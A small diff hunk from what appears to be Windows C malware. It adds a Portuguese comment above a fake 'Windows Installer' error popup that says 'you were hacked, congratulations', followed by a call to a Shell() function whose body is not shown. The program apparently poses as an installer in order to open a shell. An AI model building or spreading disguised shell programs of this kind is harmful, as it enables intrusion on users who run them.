@@ -172,6 +172,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
         goto start;
 
     }
+    //comente esta parte caso nao queira um popup
     MessageBox(NULL, TEXT("Voce foi hackeado parabens!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
     //chama a shell la em cima
     Shell();
